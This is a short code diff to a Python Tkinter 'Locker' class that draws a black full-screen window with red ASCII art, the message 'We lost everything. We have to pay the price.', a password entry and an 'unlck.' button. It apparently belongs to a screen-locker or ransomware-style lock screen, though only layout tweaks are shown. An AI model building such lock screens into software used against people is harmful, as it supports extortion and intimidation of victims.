@@ -70,16 +70,15 @@ class Locker():
   // |  / / //___) ) ||  / / //___) ) //  ) ) / ___  //   ) ) //   ) / //___) ) / ___  |   //  / /  / / //   ) ) //   / / 
  //  | / / //        || / / //       //      //     //   / / //   / / //       //    | |  //  / /  / / //   / / ((___/ /  
 //   |/ / ((____     ||/ / ((____   //      //     ((___( ( ((___/ / ((____   //     | | ((__( (__/ / ((___( (      / /   
-
 ''', font=("Courier", 12), fg='red', bg='black')
         txt_three = Label(self.win, text='''We lost everything.
          We have to pay the price.
          Yea,we lost everything.
-             We have to pay the price.''', font=("Courier", font_size), fg='white', bg='black')
+             We have to pay the price.''', font=("Courier", 20), fg='white', bg='black')
         txt_one.grid(column=0,row=0),txt_three.grid(column=0,row=0)
-        txt_one.place(relx = .12, rely = .04),txt_three.place(relx = .01, rely = .41)
+        txt_one.place(relx = .12, rely = .04),txt_three.place(relx = .07, rely = .25)
         txt = Entry(self.win)
-        btn = Button(self.win, text="passw", command=clicked)  
+        btn = Button(self.win, text="unlck.", command=clicked)  
         txt.place(relx = .28, rely = .6, relwidth=.3, relheight=.06)
         btn.place(relx = .62, rely = .6, relwidth=.1, relheight=.06)
         self.win.mainloop()
